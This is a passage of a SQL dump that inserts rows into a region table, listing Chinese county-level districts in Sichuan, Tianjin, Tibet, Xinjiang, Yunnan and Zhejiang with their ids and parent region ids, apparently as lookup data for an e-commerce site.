INSERT INTO `ec22703249_region` VALUES ('2888', '339', '江安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2889', '339', '长宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2890', '339', '高县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2891', '339', '珙县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2892', '339', '筠连县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2893', '339', '兴文县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2894', '339', '屏山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2895', '340', '雁江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2896', '340', '简阳市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2897', '340', '安岳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2898', '340', '乐至县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2899', '341', '大安区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2900', '341', '自流井区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2901', '341', '贡井区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2902', '341', '沿滩区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2903', '341', '荣县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2904', '341', '富顺县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2905', '342', '江阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2906', '342', '纳溪区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2907', '342', '龙马潭区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2908', '342', '泸县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2909', '342', '合江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2910', '342', '叙永县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2911', '342', '古蔺县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2912', '343', '和平区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2913', '343', '河西区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2914', '343', '南开区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2915', '343', '河北区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2916', '343', '河东区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2917', '343', '红桥区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2918', '343', '东丽区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2919', '343', '津南区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2920', '343', '西青区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2921', '343', '北辰区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2922', '343', '塘沽区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2923', '343', '汉沽区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2924', '343', '大港区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2925', '343', '武清区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2926', '343', '宝坻区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2927', '343', '经济开发区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2928', '343', '宁河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2929', '343', '静海县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2930', '343', '蓟县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2931', '344', '城关区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2932', '344', '林周县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2933', '344', '当雄县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2934', '344', '尼木县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2935', '344', '曲水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2936', '344', '堆龙德庆县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2937', '344', '达孜县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2938', '344', '墨竹工卡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2939', '345', '噶尔县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2940', '345', '普兰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2941', '345', '札达县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2942', '345', '日土县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2943', '345', '革吉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2944', '345', '改则县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2945', '345', '措勤县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2946', '346', '昌都县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2947', '346', '江达县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2948', '346', '贡觉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2949', '346', '类乌齐县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2950', '346', '丁青县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2951', '346', '察雅县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2952', '346', '八宿县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2953', '346', '左贡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2954', '346', '芒康县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2955', '346', '洛隆县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2956', '346', '边坝县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2957', '347', '林芝县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2958', '347', '工布江达县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2959', '347', '米林县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2960', '347', '墨脱县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2961', '347', '波密县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2962', '347', '察隅县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2963', '347', '朗县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2964', '348', '那曲县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2965', '348', '嘉黎县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2966', '348', '比如县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2967', '348', '聂荣县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2968', '348', '安多县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2969', '348', '申扎县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2970', '348', '索县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2971', '348', '班戈县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2972', '348', '巴青县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2973', '348', '尼玛县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2974', '349', '日喀则市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2975', '349', '南木林县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2976', '349', '江孜县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2977', '349', '定日县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2978', '349', '萨迦县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2979', '349', '拉孜县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2980', '349', '昂仁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2981', '349', '谢通门县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2982', '349', '白朗县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2983', '349', '仁布县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2984', '349', '康马县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2985', '349', '定结县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2986', '349', '仲巴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2987', '349', '亚东县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2988', '349', '吉隆县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2989', '349', '聂拉木县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2990', '349', '萨嘎县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2991', '349', '岗巴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2992', '350', '乃东县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2993', '350', '扎囊县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2994', '350', '贡嘎县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2995', '350', '桑日县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2996', '350', '琼结县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2997', '350', '曲松县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2998', '350', '措美县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('2999', '350', '洛扎县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3000', '350', '加查县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3001', '350', '隆子县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3002', '350', '错那县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3003', '350', '浪卡子县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3004', '351', '天山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3005', '351', '沙依巴克区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3006', '351', '新市区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3007', '351', '水磨沟区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3008', '351', '头屯河区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3009', '351', '达坂城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3010', '351', '米东区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3011', '351', '乌鲁木齐县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3012', '352', '阿克苏市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3013', '352', '温宿县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3014', '352', '库车县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3015', '352', '沙雅县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3016', '352', '新和县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3017', '352', '拜城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3018', '352', '乌什县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3019', '352', '阿瓦提县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3020', '352', '柯坪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3021', '353', '阿拉尔市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3022', '354', '库尔勒市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3023', '354', '轮台县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3024', '354', '尉犁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3025', '354', '若羌县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3026', '354', '且末县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3027', '354', '焉耆', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3028', '354', '和静县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3029', '354', '和硕县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3030', '354', '博湖县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3031', '355', '博乐市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3032', '355', '精河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3033', '355', '温泉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3034', '356', '呼图壁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3035', '356', '米泉市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3036', '356', '昌吉市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3037', '356', '阜康市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3038', '356', '玛纳斯县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3039', '356', '奇台县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3040', '356', '吉木萨尔县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3041', '356', '木垒', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3042', '357', '哈密市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3043', '357', '伊吾县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3044', '357', '巴里坤', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3045', '358', '和田市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3046', '358', '和田县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3047', '358', '墨玉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3048', '358', '皮山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3049', '358', '洛浦县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3050', '358', '策勒县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3051', '358', '于田县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3052', '358', '民丰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3053', '359', '喀什市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3054', '359', '疏附县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3055', '359', '疏勒县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3056', '359', '英吉沙县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3057', '359', '泽普县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3058', '359', '莎车县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3059', '359', '叶城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3060', '359', '麦盖提县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3061', '359', '岳普湖县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3062', '359', '伽师县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3063', '359', '巴楚县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3064', '359', '塔什库尔干', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3065', '360', '克拉玛依市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3066', '361', '阿图什市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3067', '361', '阿克陶县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3068', '361', '阿合奇县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3069', '361', '乌恰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3070', '362', '石河子市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3071', '363', '图木舒克市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3072', '364', '吐鲁番市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3073', '364', '鄯善县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3074', '364', '托克逊县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3075', '365', '五家渠市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3076', '366', '阿勒泰市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3077', '366', '布克赛尔', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3078', '366', '伊宁市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3079', '366', '布尔津县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3080', '366', '奎屯市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3081', '366', '乌苏市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3082', '366', '额敏县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3083', '366', '富蕴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3084', '366', '伊宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3085', '366', '福海县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3086', '366', '霍城县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3087', '366', '沙湾县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3088', '366', '巩留县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3089', '366', '哈巴河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3090', '366', '托里县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3091', '366', '青河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3092', '366', '新源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3093', '366', '裕民县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3094', '366', '和布克赛尔', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3095', '366', '吉木乃县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3096', '366', '昭苏县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3097', '366', '特克斯县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3098', '366', '尼勒克县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3099', '366', '察布查尔', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3100', '367', '盘龙区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3101', '367', '五华区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3102', '367', '官渡区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3103', '367', '西山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3104', '367', '东川区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3105', '367', '安宁市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3106', '367', '呈贡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3107', '367', '晋宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3108', '367', '富民县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3109', '367', '宜良县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3110', '367', '嵩明县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3111', '367', '石林县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3112', '367', '禄劝', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3113', '367', '寻甸', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3114', '368', '兰坪', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3115', '368', '泸水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3116', '368', '福贡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3117', '368', '贡山', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3118', '369', '宁洱', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3119', '369', '思茅区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3120', '369', '墨江', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3121', '369', '景东', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3122', '369', '景谷', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3123', '369', '镇沅', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3124', '369', '江城', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3125', '369', '孟连', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3126', '369', '澜沧', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3127', '369', '西盟', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3128', '370', '古城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3129', '370', '宁蒗', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3130', '370', '玉龙', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3131', '370', '永胜县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3132', '370', '华坪县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3133', '371', '隆阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3134', '371', '施甸县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3135', '371', '腾冲县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3136', '371', '龙陵县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3137', '371', '昌宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3138', '372', '楚雄市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3139', '372', '双柏县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3140', '372', '牟定县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3141', '372', '南华县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3142', '372', '姚安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3143', '372', '大姚县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3144', '372', '永仁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3145', '372', '元谋县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3146', '372', '武定县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3147', '372', '禄丰县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3148', '373', '大理市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3149', '373', '祥云县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3150', '373', '宾川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3151', '373', '弥渡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3152', '373', '永平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3153', '373', '云龙县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3154', '373', '洱源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3155', '373', '剑川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3156', '373', '鹤庆县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3157', '373', '漾濞', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3158', '373', '南涧', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3159', '373', '巍山', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3160', '374', '潞西市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3161', '374', '瑞丽市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3162', '374', '梁河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3163', '374', '盈江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3164', '374', '陇川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3165', '375', '香格里拉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3166', '375', '德钦县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3167', '375', '维西', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3168', '376', '泸西县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3169', '376', '蒙自县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3170', '376', '个旧市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3171', '376', '开远市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3172', '376', '绿春县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3173', '376', '建水县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3174', '376', '石屏县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3175', '376', '弥勒县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3176', '376', '元阳县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3177', '376', '红河县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3178', '376', '金平', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3179', '376', '河口', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3180', '376', '屏边', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3181', '377', '临翔区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3182', '377', '凤庆县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3183', '377', '云县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3184', '377', '永德县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3185', '377', '镇康县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3186', '377', '双江', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3187', '377', '耿马', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3188', '377', '沧源', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3189', '378', '麒麟区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3190', '378', '宣威市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3191', '378', '马龙县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3192', '378', '陆良县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3193', '378', '师宗县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3194', '378', '罗平县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3195', '378', '富源县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3196', '378', '会泽县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3197', '378', '沾益县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3198', '379', '文山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3199', '379', '砚山县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3200', '379', '西畴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3201', '379', '麻栗坡县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3202', '379', '马关县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3203', '379', '丘北县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3204', '379', '广南县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3205', '379', '富宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3206', '380', '景洪市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3207', '380', '勐海县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3208', '380', '勐腊县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3209', '381', '红塔区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3210', '381', '江川县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3211', '381', '澄江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3212', '381', '通海县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3213', '381', '华宁县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3214', '381', '易门县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3215', '381', '峨山', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3216', '381', '新平', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3217', '381', '元江', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3218', '382', '昭阳区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3219', '382', '鲁甸县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3220', '382', '巧家县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3221', '382', '盐津县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3222', '382', '大关县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3223', '382', '永善县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3224', '382', '绥江县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3225', '382', '镇雄县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3226', '382', '彝良县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3227', '382', '威信县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3228', '382', '水富县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3229', '383', '西湖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3230', '383', '上城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3231', '383', '下城区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3232', '383', '拱墅区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3233', '383', '滨江区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3234', '383', '江干区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3235', '383', '萧山区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3236', '383', '余杭区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3237', '383', '市郊', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3238', '383', '建德市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3239', '383', '富阳市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3240', '383', '临安市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3241', '383', '桐庐县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3242', '383', '淳安县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3243', '384', '吴兴区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3244', '384', '南浔区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3245', '384', '德清县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3246', '384', '长兴县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3247', '384', '安吉县', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3248', '385', '南湖区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3249', '385', '秀洲区', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3250', '385', '海宁市', '3', '0');
INSERT INTO `ec22703249_region` VALUES ('3251', '385', '嘉善县', '3', '0');
